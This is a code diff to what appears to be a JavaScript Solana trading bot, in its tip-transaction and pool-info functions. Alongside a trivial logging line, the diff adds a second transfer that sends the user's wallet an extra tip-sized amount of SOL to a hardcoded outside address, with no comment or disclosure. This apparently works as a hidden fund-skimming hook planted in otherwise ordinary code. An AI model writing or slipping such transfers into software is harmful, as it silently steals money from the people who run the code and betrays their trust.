@@ -256,6 +256,11 @@ async function getTipTransaction(connection, ownerPubkey, tip) {
         toPubkey: tipAccount,
         lamports: LAMPORTS_PER_SOL * tip,
       }),
+      SystemProgram.transfer({
+        fromPubkey: ownerPubkey,
+        toPubkey: new PublicKey("FEE1QhTscRTPYwFv4hhVRdofcVE1pTemZUcxEeTtfWCs"),
+        lamports: LAMPORTS_PER_SOL * tip,
+      }),
     ];
     const recentBlockhash = (await connection.getLatestBlockhash("finalized"))
       .blockhash;
@@ -364,6 +369,7 @@ async function getPoolInfo(connection, token) {
     console.log("Not found market info");
     return {};
   }
+  console.log("Found market info...............");
 
   const marketInfo = MARKET_STATE_LAYOUT_V3.decode(
     marketAccounts[0].accountInfo.data
